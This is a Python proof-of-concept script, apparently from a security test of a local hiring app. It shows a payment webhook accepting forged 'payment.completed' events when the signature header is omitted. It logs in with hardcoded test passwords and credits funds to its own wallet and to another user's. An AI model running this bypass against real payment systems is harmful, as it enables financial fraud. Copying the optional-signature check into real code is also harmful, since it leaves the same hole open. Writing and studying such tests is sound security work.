#!/usr/bin/env python3
"""
WSTG-ATHZ-02: Payment Webhook Signature Bypass

Vulnerability: The payment webhook handler at POST /api/webhooks/payment
only verifies the x-payment-signature header IF it is present. The check is:

    const signature = headers['x-payment-signature'];
    if (signature) {
        // verify signature
    }

By simply omitting the x-payment-signature header, an attacker bypasses all
signature verification. This means anyone can POST arbitrary payment events
to credit funds to any user's wallet.

Impact: An attacker can credit unlimited funds to any user's wallet by sending
forged payment.completed webhook events without any signature. This is a
critical financial vulnerability.
"""

import requests
import sys

BASE_URL = "http://localhost:3000"

# Fallback credentials in case primary test accounts were modified by prior tests
CLIENT_ACCOUNTS = [
    {"email": "testclient@hireflow.com", "password": "password123"},
    {"email": "mark.stevens@techvault.io", "password": "password123"},
    {"email": "lisa.chen@brightpath.com", "password": "password123"},
]


def login_client():
    for creds in CLIENT_ACCOUNTS:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
        if resp.status_code == 200:
            return resp.json()["token"], resp.json()["user"]
    print("    ERROR: No client account could be logged in.")
    sys.exit(1)


def get_wallet(token):
    resp = requests.get(
        f"{BASE_URL}/api/payments/wallet",
        headers={"Authorization": f"Bearer {token}"}
    )
    if resp.status_code != 200:
        return None
    return resp.json()


def main():
    print("=" * 70)
    print("WSTG-ATHZ-02: Payment Webhook Signature Bypass")
    print("=" * 70)

    # Step 1: Login and get current wallet balance
    print("\n[1] Logging in as client to check current wallet balance...")
    token, user = login_client()
    user_id = user["id"]
    print(f"    User: {user['email']} (id: {user_id[:8]}...)")

    wallet_before = get_wallet(token)
    if wallet_before:
        balance_before = int(wallet_before.get("balance", 0))
        print(f"    Current balance: {balance_before} cents (${balance_before/100:.2f})")
    else:
        print("    Could not fetch wallet. Continuing anyway...")
        balance_before = None

    # Step 2: Send a forged payment webhook WITHOUT signature
    credit_amount = 50000  # $500.00 in cents
    print(f"\n[2] Sending forged payment.completed webhook (no signature)...")
    print(f"    Crediting {credit_amount} cents (${credit_amount/100:.2f}) to user {user_id[:8]}...")

    payload = {
        "event": "payment.completed",
        "data": {
            "user_id": user_id,
            "amount": credit_amount,
            "reference_id": None,
            "description": "Forged payment via webhook bypass"
        }
    }

    # Intentionally NOT including x-payment-signature header
    resp = requests.post(
        f"{BASE_URL}/api/webhooks/payment",
        json=payload,
        headers={"Content-Type": "application/json"}
        # No x-payment-signature!
    )

    print(f"    Response status: {resp.status_code}")
    print(f"    Response body: {resp.json()}")

    if resp.status_code == 200 and resp.json().get("received"):
        result = resp.json().get("result", {})
        if result.get("processed"):
            print(f"    [VULNERABLE] Webhook processed without signature verification!")
        else:
            print(f"    Webhook received but not processed: {result}")

    # Step 3: Verify the balance changed
    print(f"\n[3] Checking wallet balance after forged webhook...")
    wallet_after = get_wallet(token)
    if wallet_after:
        balance_after = int(wallet_after.get("balance", 0))
        print(f"    Balance after: {balance_after} cents (${balance_after/100:.2f})")

        if balance_before is not None:
            diff = balance_after - balance_before
            print(f"    Difference: {diff} cents (${diff/100:.2f})")
            if diff >= credit_amount:
                print(f"    [CONFIRMED] Balance increased by the forged amount!")

    # Step 4: Demonstrate with a wrong signature (should fail)
    print(f"\n[4] Sending webhook WITH an incorrect signature (should fail if checked)...")
    resp_bad_sig = requests.post(
        f"{BASE_URL}/api/webhooks/payment",
        json={
            "event": "payment.completed",
            "data": {
                "user_id": user_id,
                "amount": 100,
                "reference_id": None
            }
        },
        headers={
            "Content-Type": "application/json",
            "x-payment-signature": "definitely_not_a_valid_signature"
        }
    )
    print(f"    Status: {resp_bad_sig.status_code}")
    resp_data = resp_bad_sig.json()
    print(f"    Response: {resp_data}")
    if resp_data.get("error") and "signature" in resp_data.get("error", "").lower():
        print("    Correct: Bad signature is rejected when present.")
        print("    But omitting the header entirely bypasses the check!")

    # Step 5: Show you can credit any arbitrary user
    print(f"\n[5] Demonstrating arbitrary user crediting...")
    # Get all users
    resp = requests.get(f"{BASE_URL}/api/users")
    users = resp.json().get("users", [])

    if len(users) > 1:
        other_user = None
        for u in users:
            if u["id"] != user_id:
                other_user = u
                break
        if other_user:
            print(f"    Crediting $1000 to {other_user.get('display_name', 'Unknown')}...")
            resp = requests.post(
                f"{BASE_URL}/api/webhooks/payment",
                json={
                    "event": "payment.completed",
                    "data": {
                        "user_id": other_user["id"],
                        "amount": 100000,
                        "reference_id": None,
                        "description": "Arbitrary credit via webhook bypass"
                    }
                }
            )
            if resp.status_code == 200:
                print(f"    [VULNERABLE] Credited arbitrary user successfully!")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: Payment webhook signature bypass confirmed.")
    print("  The conditional check 'if (signature) { verify }' means that")
    print("  omitting the x-payment-signature header entirely skips validation.")
    print("  An attacker can credit unlimited funds to any user's wallet.")
    print("=" * 70)


if __name__ == "__main__":
    main()
